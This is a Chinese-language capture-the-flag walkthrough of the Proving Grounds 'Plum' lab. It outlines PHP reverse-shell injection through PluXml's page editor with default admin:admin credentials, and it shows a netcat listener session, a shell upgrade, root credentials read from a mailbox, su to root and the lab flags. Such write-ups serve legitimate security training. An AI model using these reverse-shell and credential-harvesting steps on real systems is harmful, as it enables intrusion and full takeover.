参考资料：  
[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/plum.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/plum.md)
 
完成本实验后，学习者将能够：  
枚举服务并识别在 Web 服务器上运行的 PluXml 实例。  
使用弱凭据（admin:admin）登录管理面板。  
利用静态页面编辑器注入 PHP 反向 shell 有效载荷。  
以 www-data 用户身份登录系统，找到 /var/mail 目录。  
从 www-data 邮箱中提取 root 凭据，并使用这些凭据提升权限。
    
192.168.141.28
   

┌──(kali㉿kali)-[~/Desktop/pg03/plum]  
└─$ rlwrap -cAr nc -nvlp9001  
listening on [any] 9001 ...  
connect to [192.168.45.205] from (UNKNOWN) [192.168.141.28] 59584  
Linux plum 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux  
08:15:57 up 18 min, 1 user, load average: 0.00, 0.00, 0.00  
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT  
root pts/0 192.168.45.205 08:01 13:09 0.01s 0.01s -bash  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
/bin/sh: 0: can't access tty; job control turned off  
$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
www-data@plum:/$ ls  
ls  
bin home lib32 media root sys vmlinuz  
boot initrd.img lib64 mnt run tmp vmlinuz.old  
dev initrd.img.old libx32 opt sbin usr  
etc lib lost+found proc srv var  
www-data@plum:/$ ls  
ls  
bin home lib32 media root sys vmlinuz  
boot initrd.img lib64 mnt run tmp vmlinuz.old  
dev initrd.img.old libx32 opt sbin usr  
etc lib lost+found proc srv var  
www-data@plum:/$ cat /var/spool/mail/www-data  
cat /var/spool/mail/www-data  
From root@localhost Fri Aug 25 06:31:47 2023  
Return-path: \<root@localhost\>  
Envelope-to: www-data@localhost  
Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400  
Received: from root by localhost with local (Exim 4.94.2)  
(envelope-from \<root@localhost\>)  
id 1qZU6V-0000El-Pw  
for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400  
To: www-data@localhost  
From: root@localhost  
Subject: URGENT - DDOS ATTACK"  
Reply-to: root@localhost  
Message-Id: \<E1qZU6V-0000El-Pw@localhost\>  
Date: Fri, 25 Aug 2023 06:31:47 -0400
 
We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:  
root:6s8kaZZNaZZYBMfh2YEW  
Thanks,  
Administrator
 
www-data@plum:/$  
www-data@plum:/$
 
www-data@plum:/$ cd /var/www/  
cd /var/www/  
www-data@plum:/var/www$ ls  
ls  
html local.txt  
www-data@plum:/var/www$ cat local.txt  
cat local.txt  
bcd2feb4c91e059adcad181b512a3520  
www-data@plum:/var/www$ sud root  
sud root  
bash: sud: command not found  
www-data@plum:/var/www$ su root  
su root  
Password: 6s8kaZZNaZZYBMfh2YEW
 
root@plum:/var/www# whoami  
whoami  
root  
root@plum:/var/www# cd /root  
cd /root  
root@plum:~# cat proof.txt  
cat proof.txt  
3f814971db0cd2451f27b5d47d2c3c5a  
root@plum:~# ls  
ls  
email7.txt proof.txt proof.xt  
root@plum:~#